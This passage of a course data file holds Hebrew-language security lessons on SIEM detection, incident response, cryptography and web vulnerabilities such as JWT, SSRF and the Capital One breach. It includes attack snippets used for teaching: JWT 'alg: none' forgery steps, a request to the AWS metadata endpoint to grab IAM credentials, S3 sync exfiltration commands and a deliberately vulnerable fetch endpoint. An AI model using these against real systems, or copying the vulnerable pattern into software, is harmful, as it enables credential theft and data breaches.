  <tr><td>Cloud (AWS/Azure)</td><td>API calls, IAM changes, S3 access</td><td>גבוהה</td></tr>
</table>

<div class="code-preview"><pre><code># Splunk — SPL (Search Processing Language)
# זיהוי ניסיונות brute force על SSH:
index=syslog sourcetype=linux_secure "Failed password"
| stats count by src_ip
| where count > 50
| sort -count

# זיהוי lateral movement — kerberoasting:
index=wineventlog EventCode=4769 TicketEncryptionType=0x17
| stats count by src_ip, ServiceName
| where count > 10

# ELK Stack (Elasticsearch, Logstash, Kibana) — Logstash pipeline:
# input { beats { port => 5044 } }
# filter { grok { match => { "message" => "%{SYSLOGLINE}" } } }
# output { elasticsearch { hosts => ["localhost:9200"] } }
</code></pre></div>

<p>Correlation Rules הן הלב הפועם: "אם account X נכשל בהתחברות 10 פעמים ב-5 דקות, ואז הצליח — צור alert ברמת HIGH". כלים מובילים: <strong>Splunk</strong>, <strong>IBM QRadar</strong>, <strong>Microsoft Sentinel</strong>, <strong>ELK Stack</strong>.</p>`
      },
      {
        type: "explanation",
        title: "Incident Response — מה עושים כשזה קורה",
        content: `
<h2>Incident Response: תהליך מובנה לאירועי אבטחה</h2>
<p>NIST SP 800-61 מגדיר 6 שלבים ל-Incident Response. ארגון שיש לו IR Plan מוכן — יתאושש מהיר יותר ויסבול פחות נזק.</p>

<table class="content-table">
  <tr><th>שלב</th><th>שם</th><th>פעולות מרכזיות</th></tr>
  <tr><td>1</td><td><strong>Preparation</strong></td><td>כתיבת IR Plan, הגדרת צוות, תרגולים, כלים מותקנים</td></tr>
  <tr><td>2</td><td><strong>Detection &amp; Analysis</strong></td><td>ניתוח alerts, קביעת severity, זיהוי scope</td></tr>
  <tr><td>3</td><td><strong>Containment</strong></td><td>בידוד מכונות נגועות, חסימת IOCs, snapshot לפני ניקוי</td></tr>
  <tr><td>4</td><td><strong>Eradication</strong></td><td>הסרת malware, סגירת backdoors, patch</td></tr>
  <tr><td>5</td><td><strong>Recovery</strong></td><td>חזרה לפעילות, ניטור מוגבר, validation</td></tr>
  <tr><td>6</td><td><strong>Lessons Learned</strong></td><td>Post-mortem, עדכון IR Plan, שיפור controls</td></tr>
</table>

<div class="code-preview"><pre><code># Containment — בידוד מהיר של host Windows:
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound

# Memory dump לפני כיבוי (ראיות!):
# winpmem.exe memory.dmp

# Linux — isolation:
# iptables -I INPUT -j DROP
# iptables -I OUTPUT -j DROP
# iptables -I INPUT -s [SOC_IP] -j ACCEPT

# IOC collection:
md5sum suspicious_file.exe
strings suspicious_file.exe | grep -E "(http|192\.|cmd\.exe)"
ss -tulnp  # active connections
</code></pre></div>

<p>שגיאה נפוצה: מנהלי מערכת שמגיעים ראשונים לאירוע ו<strong>מכבים את המחשב</strong> — מוחקים את הראיות שבזיכרון (passwords, encryption keys, רשימת processes). <strong>תמיד תחילה לאסוף ראיות, אחר כך לבדל.</strong></p>`
      },
      {
        type: "story",
        title: "סיפור: אנליסט SOC מגלה תנועה לרוחב הרשת",
        content: `
<h2>שגרת לילה ב-SOC</h2>

<p>02:47 לפנות בוקר. דנה, אנליסטית SOC שנה שנייה, שותה את הקפה השלישי שלה ובוהה ב-Splunk dashboard. 847 alerts פתוחים — רובם false positives. ואז alert אחד בצבע כתום תופס את עינה.</p>

<p><strong>ALERT: Unusual Service Account Login — 23 workstations in 4 minutes</strong></p>

<p>חשבון שירות בשם <code>svc_backup</code> — שאמור לרוץ רק על שרת ה-backup בין 02:00-03:00 — הזדהה ב-23 תחנות עבודה שונות בזמן קצר מאוד. זה לא נורמלי.</p>

<div class="code-preview"><pre><code>-- Splunk query שדנה הריצה:
index=wineventlog EventCode=4624 Account_Name="svc_backup"
| stats count dc(ComputerName) as unique_hosts by _time span=1m
| where unique_hosts > 5

-- תוצאה:
-- 02:43 -- 23 unique hosts בדקה אחת
-- זה lateral movement קלאסי
</code></pre></div>

<p>דנה עברה על ה-EDR: על כל אחת מ-23 התחנות, תוך שניות מהכניסה, רץ <code>cmd.exe /c whoami &amp;&amp; ipconfig &amp;&amp; net user</code>. שאילתות reconnaissance — תוקף שמרים מידע על הסביבה.</p>

<p>על אחת התחנות — <code>WS-FINANCE-07</code> — ה-EDR הראה משהו חמור יותר: הרצת <code>mimikatz.exe</code>, כלי ידוע לגניבת credentials מזיכרון Windows. התוקף כבר ניסה להשיג credentials של admin domain.</p>

<p>דנה הפעילה את ה-IR Plan. בשלוש דקות: בודד את WS-FINANCE-07 מהרשת, חסם את <code>svc_backup</code> ב-AD, הקפיצה את incident severity ל-P1, עירה את ה-CISO.</p>

<div class="code-preview"><pre><code>-- Timeline שנבנה בדיעבד:
-- 01:15 -- Phishing email נפתח על WS-SALES-12
-- 01:17 -- PowerShell empire agent הותקן
-- 02:30 -- תוקף מצא credentials של svc_backup בקובץ config
-- 02:43 -- Lateral movement מסיבי -- 23 hosts ב-4 דקות
-- 02:47 -- SIEM alert -- דנה מתעוררת
-- 02:51 -- Containment בוצע
</code></pre></div>

<p><strong>הסוף הטוב:</strong> הודות לdetection מהיר ו-IR Plan מתורגל — התוקף לא הגיע לשרתי הייצור ולא גנב נתונים. זמן מ-Compromise ל-Containment: 96 דקות. ממוצע בתעשייה: 197 ימים. ההבדל — SIEM + אנליסט ערני ב-02:47 לפנות בוקר.</p>`
      }
    ]
  },

  // ─── Chapter 105: קריפטוגרפיה יישומית ───────────────────────────────────
  {
    id: 105,
    title: "קריפטוגרפיה יישומית",
    pages: [
      {
        type: "explanation",
        title: "Symmetric vs Asymmetric — שני עולמות ההצפנה",
        content: `
<h2>הצפנה סימטרית ואסימטרית: היסודות</h2>
<p>כל תקשורת מאובטחת מסתמכת על שני סוגי הצפנה. הבנת ההבדל ביניהם חיונית להבנת TLS, PKI, ו-signatures.</p>

<div class="diagram-container">
<svg viewBox="0 0 360 120" class="content-diagram" xmlns="http://www.w3.org/2000/svg">
  <rect width="360" height="120" fill="#1e293b" rx="8"/>
  <rect x="10" y="20" width="155" height="85" fill="#1e293b" stroke="#334155" stroke-width="1" rx="4"/>
  <text x="87" y="38" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="bold">Symmetric (AES)</text>
  <rect x="20" y="50" width="40" height="20" fill="#1e40af" rx="3"/>
  <text x="40" y="64" text-anchor="middle" fill="#e2e8f0" font-size="9">Alice</text>
  <rect x="115" y="50" width="40" height="20" fill="#1e40af" rx="3"/>
  <text x="135" y="64" text-anchor="middle" fill="#e2e8f0" font-size="9">Bob</text>
  <line x1="62" y1="60" x2="113" y2="60" stroke="#22c55e" stroke-width="2" stroke-dasharray="4,2"/>
  <text x="87" y="56" text-anchor="middle" fill="#22c55e" font-size="8">same key</text>
  <text x="87" y="95" text-anchor="middle" fill="#94a3b8" font-size="8">מהיר, אבל איך מחליפים מפתח?</text>
  <rect x="195" y="20" width="155" height="85" fill="#1e293b" stroke="#334155" stroke-width="1" rx="4"/>
  <text x="272" y="38" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="bold">Asymmetric (RSA)</text>
  <rect x="205" y="50" width="40" height="20" fill="#1e40af" rx="3"/>
  <text x="225" y="64" text-anchor="middle" fill="#e2e8f0" font-size="9">Alice</text>
  <rect x="300" y="50" width="40" height="20" fill="#1e40af" rx="3"/>
  <text x="320" y="64" text-anchor="middle" fill="#e2e8f0" font-size="9">Bob</text>
  <line x1="247" y1="60" x2="298" y2="60" stroke="#f97316" stroke-width="2"/>
  <text x="272" y="54" text-anchor="middle" fill="#f97316" font-size="7">pub key encrypt</text>
  <text x="272" y="74" text-anchor="middle" fill="#eab308" font-size="7">priv key decrypt</text>
  <text x="272" y="95" text-anchor="middle" fill="#94a3b8" font-size="8">איטי, פותר חילופי מפתח</text>
</svg>
</div>

<table class="content-table">
  <tr><th>מאפיין</th><th>Symmetric</th><th>Asymmetric</th></tr>
  <tr><td>אלגוריתמים</td><td>AES-256, ChaCha20, 3DES</td><td>RSA-2048/4096, ECC (P-256), DH</td></tr>
  <tr><td>מפתחות</td><td>מפתח אחד לשני הצדדים</td><td>זוג: public + private</td></tr>
  <tr><td>מהירות</td><td>מהיר מאוד (hardware AES)</td><td>איטי (חישוב מתמטי כבד)</td></tr>
  <tr><td>שימוש</td><td>הצפנת bulk data, disk encryption</td><td>חילופי מפתחות, signatures, TLS</td></tr>
  <tr><td>בעיה</td><td>Key distribution</td><td>ניהול certificates, PKI</td></tr>
  <tr><td>גודל מאובטח</td><td>AES-128+ (AES-256 מומלץ)</td><td>RSA-2048+ / ECC-256+</td></tr>
</table>

<div class="code-preview"><pre><code># Python — AES-256-GCM (הצפנה + integrity יחד):
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = os.urandom(32)       # 256-bit key
nonce = os.urandom(12)     # 96-bit nonce -- חובה ייחודי לכל הודעה!
aad = b"header_data"       # Associated data

aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, b"secret message", aad)
plaintext = aesgcm.decrypt(nonce, ciphertext, aad)
# GCM = AEAD: confidentiality + integrity + authenticity
</code></pre></div>

<p><strong>ECC (Elliptic Curve Cryptography)</strong> מציע אבטחה שוות ערך ל-RSA עם מפתחות קטנים בהרבה: ECC-256 ≈ RSA-3072. לכן TLS 1.3 מעדיף ECDH ו-ECDSA על RSA.</p>`
      },
      {
        type: "explanation",
        title: "TLS 1.3 Handshake — איך HTTPS באמת עובד",
        content: `
<h2>TLS 1.3: Handshake בשני Round-Trips</h2>
<p>TLS (Transport Layer Security) הוא הפרוטוקול שמאבטח כל חיבור HTTPS. גרסה 1.3 (RFC 8446, 2018) שיפרה דרמטית את הביצועים והאבטחה.</p>

<div class="diagram-container">
<svg viewBox="0 0 360 160" class="content-diagram" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <marker id="arrowB" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
      <path d="M0,0 L0,6 L6,3 Z" fill="#3b82f6"/>
    </marker>
    <marker id="arrowG" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
      <path d="M0,0 L0,6 L6,3 Z" fill="#22c55e"/>
    </marker>
  </defs>
  <rect width="360" height="160" fill="#1e293b" rx="8"/>
  <text x="60" y="18" text-anchor="middle" fill="#3b82f6" font-size="11" font-weight="bold">Client</text>
  <line x1="60" y1="22" x2="60" y2="155" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="3,2"/>
  <text x="300" y="18" text-anchor="middle" fill="#22c55e" font-size="11" font-weight="bold">Server</text>
  <line x1="300" y1="22" x2="300" y2="155" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="3,2"/>
  <line x1="62" y1="42" x2="297" y2="42" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowB)"/>
  <text x="180" y="39" text-anchor="middle" fill="#e2e8f0" font-size="8">ClientHello (TLS version, ciphers, key_share)</text>
  <line x1="297" y1="70" x2="63" y2="70" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arrowG)"/>
  <text x="180" y="67" text-anchor="middle" fill="#e2e8f0" font-size="8">ServerHello + Certificate + Finished</text>
  <text x="180" y="80" text-anchor="middle" fill="#94a3b8" font-size="7">(כבר מוצפן! ECDH key derived)</text>
  <line x1="62" y1="103" x2="297" y2="103" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowB)"/>
  <text x="180" y="100" text-anchor="middle" fill="#e2e8f0" font-size="8">Client Finished + Application Data</text>
  <line x1="297" y1="128" x2="63" y2="128" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arrowG)"/>
  <text x="180" y="125" text-anchor="middle" fill="#e2e8f0" font-size="8">Application Data</text>
  <text x="180" y="150" text-anchor="middle" fill="#ef4444" font-size="8">TLS 1.3: 1-RTT (TLS 1.2 היה 2-RTT)</text>
</svg>
</div>

<div class="code-preview"><pre><code># בדיקת TLS של שרת:
openssl s_client -connect example.com:443 -tls1_3

# מה לחפש בתוצאה:
# Protocol: TLSv1.3
# Cipher: TLS_AES_256_GCM_SHA384
# Server public key: 256 bit EC (ECDH ephemeral)
# Verify return code: 0 (ok)

# HSTS — מניעת downgrade attacks:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
</code></pre></div>

<p>שיפורים מרכזיים ב-TLS 1.3: הסרת cipher suites חלשים (RC4, 3DES, SHA-1), <strong>Forward Secrecy</strong> מחייב (ECDHE בכל חיבור), ו-0-RTT mode לחיבורים חוזרים. אם private key נגנב היום — sessions עבר לא ניתנים לפצח.</p>`
      },
      {
        type: "explanation",
        title: "טעויות קריפטוגרפיה נפוצות",
        content: `
<h2>Crypto Mistakes: כשהמתמטיקה נכונה אבל ההגדרה שגויה</h2>
<p>גם הצפנה חזקה יכולה להיות שבירה אם מיישמים אותה לא נכון. רוב הפגיעויות בעולם האמיתי אינן שוברות את האלגוריתם — הן מנצלות שגיאות implement.</p>

<table class="content-table">
  <tr><th>טעות</th><th>הסבר</th><th>תיקון</th></tr>
  <tr>
    <td>ECB Mode</td>
    <td>אותו plaintext = אותו ciphertext — דפוסים גלויים</td>
    <td>השתמש ב-GCM / CBC עם random IV</td>
  </tr>
  <tr>
    <td>Reuse IV / Nonce</td>
    <td>שימוש חוזר ב-IV עם אותו key — שובר GCM לחלוטין</td>
    <td>IV/nonce חייב random ייחודי לכל הצפנה</td>
  </tr>
  <tr>
    <td>Padding Oracle</td>
    <td>שגיאת padding מוסרת מידע (POODLE, CBC oracle)</td>
    <td>AEAD ciphers (GCM), Encrypt-then-MAC</td>
  </tr>
  <tr>
    <td>Weak RNG</td>
    <td>rand() לקריפטו — keys ניתנים לניחוש</td>
    <td>os.urandom() / crypto.getRandomValues()</td>
  </tr>
  <tr>
    <td>MD5/SHA1 לpasswords</td>
    <td>Hash מהיר ניתן ל-brute force ב-GPU</td>
    <td>bcrypt / Argon2 / PBKDF2 עם work factor</td>
  </tr>
  <tr>
    <td>Certificate Pinning Bypass</td>
    <td>אפליקציה לא מאמתת cert כראוי — Frida hook</td>
    <td>Certificate pinning + integrity checks</td>
  </tr>
</table>

<div class="code-preview"><pre><code># Password hashing נכון:
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# rounds=12 = ~250ms לחישוב. מספיק להגן, לא מספיק ל-brute force.
# bcrypt.checkpw(password.encode(), hashed) -- לאימות

# מה לא לעשות:
# import hashlib
# hashlib.md5(password.encode()).hexdigest()  # נשבר תוך שניות ב-GPU

# AES-GCM נכון — nonce חדש לכל הצפנה:
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = os.urandom(32)
# כל קריאה: nonce = os.urandom(12)  -- חדש!
# אף פעם לא counter פשוט אם יש multi-thread/multi-process
</code></pre></div>`
      },
      {
        type: "story",
        title: "סיפור: Dual EC DRBG — הדלת האחורית של NSA",
        content: `
<h2>Dual EC DRBG: כשה-NSA שתל backdoor בתקן קריפטוגרפיה</h2>

<p>2006. NIST פרסם תקן חדש ל-Random Number Generation: SP 800-90A. בין ארבעה אלגוריתמים — אחד בשם <strong>Dual EC DRBG</strong>. NSA דחפה חזק לאמץ אותו. NIST קיבל.</p>

<p>Dual EC DRBG התבסס על שתי נקודות על עקומה אליפטית: P ו-Q. NIST פרסם ערכים ספציפיים — ולא הסביר מאיפה הם.</p>

<p>ב-2007, שני חוקרים מ-Microsoft — Dan Shumow ו-Niels Ferguson — הציגו בכנס Crypto הדגמה עדינה: <strong>אם מישהו יודע את הקשר המתמטי בין P ל-Q, הוא יכול לחזות את כל הפלט של הגנרטור.</strong></p>

<div class="code-preview"><pre><code>// המתמטיקה מאחורי ה-backdoor (מפושט):
// P, Q -- נקודות על עקומה אליפטית
// אם Q = e * P (מספר סודי e כך שQ = e*P)
// אז מי שמכיר את e -- יכול מהפלט הראשון לשחזר את כל הפלט העתידי

// ה-NSA ידעה e -- כי היא בחרה את P ו-Q
// NIST לא ידעה e
// כולם אחרים לא ידעו e

// תוצאה:
// כל מי שהשתמש ב-Dual EC DRBG --
// ה-session keys שלו ניתנים לשחזור על ידי NSA
</code></pre></div>

<p>2013. אדוארד סנואודן מדליף מסמכים. בין המסמכים: תוכנית NSA בשם <strong>Bullrun</strong>, תקציב $250 מיליון לשנה. מטרה: "להשפיע על תקני הצפנה". שורה ספציפית הזכירה Dual EC DRBG.</p>

<p>RSA Security קיבלה $10 מיליון מה-NSA כדי להפוך את Dual EC DRBG לברירת המחדל ב-BSAFE toolkit. מיליוני מוצרים השתמשו בו.</p>

<p>NIST ביטלה את ההמלצה. RSA שחררה עדכון. אבל הנזק לאמון בתהליך standardization היה עצום.</p>

<p><strong>הלקח:</strong> קריפטוגרפיה טובה מתבססת על עקרון Kerckhoffs — האלגוריתם פתוח לציבור, רק המפתח סודי. Peer review ו-transparency הם ההגנה היחידה מפני backdoors. כל "סמוך עלינו" בקריפטוגרפיה — הוא דגל אדום.</p>`
      }
    ]
  },

  // ─── Chapter 106: Web Application Security ────────────────────────────────
  {
    id: 106,
    title: "Web Application Security",
    pages: [
      {
        type: "explanation",
        title: "OWASP Top 10 — עשרת הפגיעויות הנפוצות ביותר",
        content: `
<h2>OWASP Top 10 (2021): מפת הדרכים של Web Security</h2>
<p><strong>OWASP (Open Web Application Security Project)</strong> מפרסם כל כמה שנים את רשימת 10 הפגיעויות הנפוצות ביותר. זוהי מפת הדרכים של כל בודק חדירה ומפתח.</p>

<table class="content-table">
  <tr><th>#</th><th>שם</th><th>תיאור</th><th>דוגמה</th></tr>
  <tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>גישה למשאבים שאינם מאושרים</td><td>IDOR — /api/users/123 → שנה ל-124</td></tr>
  <tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>הצפנה חלשה או חסרה</td><td>HTTP במקום HTTPS, MD5 לpasswords</td></tr>
  <tr><td>A03</td><td><strong>Injection</strong></td><td>SQL/LDAP/OS injection</td><td>SQLi, Command injection, SSTI</td></tr>
  <tr><td>A04</td><td><strong>Insecure Design</strong></td><td>ליקויי ארכיטקטורה</td><td>חסר rate limiting, חסר threat modeling</td></tr>
  <tr><td>A05</td><td><strong>Security Misconfiguration</strong></td><td>הגדרות ברירת מחדל לא בטוחות</td><td>Debug mode בproduction, S3 bucket public</td></tr>
  <tr><td>A06</td><td><strong>Vulnerable Components</strong></td><td>תלויות מיושנות עם CVEs</td><td>Log4Shell ב-Log4j 2.x</td></tr>
  <tr><td>A07</td><td><strong>Auth Failures</strong></td><td>בעיות אימות וניהול session</td><td>Weak passwords, JWT none algorithm</td></tr>
  <tr><td>A08</td><td><strong>Software Integrity Failures</strong></td><td>CI/CD ועדכונים ללא verification</td><td>SolarWinds — עדכון עם backdoor</td></tr>
  <tr><td>A09</td><td><strong>Logging Failures</strong></td><td>חוסר ניטור ורישום</td><td>Target 2013 — SIEM התריע, אף אחד לא פעל</td></tr>
  <tr><td>A10</td><td><strong>SSRF</strong></td><td>Server-Side Request Forgery</td><td>Capital One 2019 — AWS metadata leak</td></tr>
</table>

<p>A01 — Broken Access Control — עלה ל-#1 ב-2021 (היה #5 ב-2017). זה מהאיומים הנפוצים ביותר בפועל. כל endpoint חייב לאמת: <strong>מי מבקש?</strong> ו-<strong>האם הוא מורשה לגשת לריסורס הספציפי הזה?</strong></p>

<p>רשימה זו היא נקודת ההתחלה לכל Security Review. אם מערכת שלך עמידה בכל 10 — אתה כבר ברמה גבוהה משמעותית מממוצע השוק.</p>`
      },
      {
        type: "explanation",
        title: "Authentication Flaws — כשזהות אינה מאומתת",
        content: `
<h2>Authentication Failures: JWT, Session Fixation, ועוד</h2>
<p>פגיעויות authentication חמורות במיוחד כי הן מאפשרות לתוקף להתחזות למשתמש לגיטימי — לעיתים ללא ידיעתו.</p>

<div class="code-preview"><pre><code>// JWT (JSON Web Token) — none algorithm attack
// JWT = header.payload.signature (Base64, לא מוצפן!)

// header רגיל:
// { "alg": "HS256", "typ": "JWT" }

// התקפה — שלבים:
// 1. decode את ה-JWT (Base64)
// 2. שנה payload: { "user": "admin", "role": "admin" }
// 3. שנה header:  { "alg": "none", "typ": "JWT" }
// 4. שלח ללא signature: header.payload.
// ספריות פגיעות קיבלו "alg: none" כ-valid!

// פגיע:
const decoded = jwt.verify(token, secret);
// לא מציין algorithm -- מאפשר none

// בטוח:
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
</code></pre></div>

<div class="code-preview"><pre><code>// Session Fixation Attack:
// 1. תוקף מבקר באתר, מקבל: sessionId=ABC123
// 2. שולח לקורבן: https://bank.com/login?sessionId=ABC123
// 3. קורבן מתחבר -- שרת מאמת, שומר session ID=ABC123
// 4. תוקף משתמש ב-session המאומת של הקורבן!

// תיקון: regenerate session ID אחרי authentication
// PHP: session_regenerate_id(true);
// Node.js: req.session.regenerate(callback);

// Password hashing נכון:
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);
const valid = await bcrypt.compare(inputPassword, hash);
// אל תשתמש ב: crypto.createHash('md5').update(password).digest('hex')
</code></pre></div>

<table class="content-table">
  <tr><th>בעיה</th><th>ההשלכה</th><th>פתרון</th></tr>
  <tr><td>Weak password policy</td><td>ניחוש / credential stuffing</td><td>12+ תווים + MFA</td></tr>
  <tr><td>Session ID בURL</td><td>Browser history, Referer leakage</td><td>HttpOnly cookie בלבד</td></tr>
  <tr><td>JWT none algorithm</td><td>התחזות לכל משתמש</td><td>Specify algorithms explicitly</td></tr>
  <tr><td>Unlimited login attempts</td><td>Brute force</td><td>Rate limiting + account lockout</td></tr>
  <tr><td>Predictable token</td><td>ניחוש session</td><td>crypto.randomBytes(32)</td></tr>
</table>`
      },
      {
        type: "explanation",
        title: "SSRF — כשהשרת הופך לכלי בידי התוקף",
        content: `
<h2>SSRF: Server-Side Request Forgery</h2>
<p>SSRF (A10 ב-OWASP 2021) מאפשר לתוקף לגרום לשרת לבצע HTTP requests עבורו — לדסטינציות שהתוקף לא יכול לגשת אליהן ישירות. בסביבות cloud זה קריטי במיוחד.</p>

<div class="code-preview"><pre><code>// קוד פגיע — SSRF classic:
app.post('/fetch-url', async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url);  // תוקף שולח URL כלשהו!
  res.json(await response.json());
});

// תוקף שולח:
// url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
// AWS Instance Metadata Service -- זמין לכל EC2 instance!
// תגובה:
// {
//   "AccessKeyId": "ASIA...",
//   "SecretAccessKey": "...",
//   "Token": "...",
//   "Expiration": "2024-12-31T23:59:59Z"
// }
// עם credentials אלה -- גישה מלאה ל-AWS account!
</code></pre></div>

<div class="code-preview"><pre><code>// הגנות נגד SSRF:

// 1. Allowlist של domains:
const ALLOWED = ['api.trusted.com', 'cdn.company.com'];
const parsed = new URL(url);
if (!ALLOWED.includes(parsed.hostname)) throw new Error('Not allowed');

// 2. Block private IP ranges:
const PRIVATE = ['10.', '172.16.', '192.168.', '127.', '169.254.'];
const resolved = await dns.lookup(parsed.hostname);
if (PRIVATE.some(r => resolved.address.startsWith(r))) throw new Error('Private IP');

// 3. AWS IMDSv2 -- Token-based (הגנת AWS):
// דורש PUT request לפני GET -- SSRF פשוט לא יעבוד

// 4. Network-level: block 169.254.169.254 בFirewall
</code></pre></div>

<p>SSRF יכול לשמש גם ל-<strong>internal port scanning</strong> (מגלה שירותים פנימיים), גישה ל-<strong>Redis / Elasticsearch</strong> ללא auth, וב-<strong>blind SSRF</strong> — out-of-band confirmation דרך DNS lookup לשרת חיצוני.</p>`
      },
      {
        type: "story",
        title: "סיפור: Capital One 2019 — SSRF שעלה ב-106 מיליון לקוחות",
        content: `
<h2>Capital One 2019: מ-WAF מוטעה ל-106 מיליון רשומות</h2>

<p>יולי 2019. Capital One, אחד מחמשת הבנקים הגדולים בארה"ב, מפרסם הודעה: <strong>106 מיליון לקוחות נפגעו.</strong> שמות, כתובות, מספרי ביטוח לאומי, נתוני אשראי — הכל דלף. הנזק המוערך: $150-$300 מיליון.</p>

<p>הפורצת: Paige Thompson, לשעבר מהנדסת AWS. היא מצאה פגיעות SSRF ב-Web Application Firewall שהחברה הגדירה בצורה לא נכונה על AWS.</p>

<p>ה-WAF הוגדר לקבל URLs ולבצע requests עליהם — אבל לא נחסמו requests לכתובות פנימיות:</p>

<div class="code-preview"><pre><code>// שלב 1: SSRF לAWS Metadata Service
// Thompson שלחה לWAF:
// GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

// תגובה: IAM role credentials של ה-WAF!
// AccessKeyId, SecretAccessKey, Token...

// שלב 2: שימוש בcredentials
// aws configure  (הגדרת הcredentials שנגנבו)
// aws s3 ls      (רשימת S3 buckets)

// שלב 3: הורדת הנתונים
// ה-IAM role של ה-WAF הייתה לו גישת קריאה לbuckets של לקוחות
// aws s3 sync s3://capital-one-customer-data ./local-copy
</code></pre></div>

<p>שרשרת הטעויות:
<br>1. <strong>WAF מבצע HTTP requests</strong> — לא היה צריך להיות מוגדר כך כלל
<br>2. <strong>IAM over-permissive</strong> — ה-role קיבל גישה ל-S3 buckets ללא צורך
<br>3. <strong>ללא Least Privilege</strong> — עיקרון בסיסי שהפרתו אפשרה את הכל
<br>4. <strong>ללא IMDSv2</strong> — אם היה מופעל, ה-SSRF הפשוט לא היה עובד</p>

<p>Thompson זוהתה כי פרסמה ב-GitHub (ריפוזיטורי שהיה public לזמן קצר) את ה-credentials. חוקר אבטחה ראה, דיווח לCapital One, ה-FBI עצרה אותה. נגזרה ל-5 שנות מבחן.</p>

<p><strong>הלקח:</strong> SSRF + IAM over-permissive = הרסני. בכל סביבת cloud: Enable IMDSv2, Least Privilege IAM, חסום metadata endpoints ברמת network. ולעולם אל תכניס credentials ל-GitHub — אפילו לשנייה.</p>`
      }
    ]
  }
];

export default chapters;
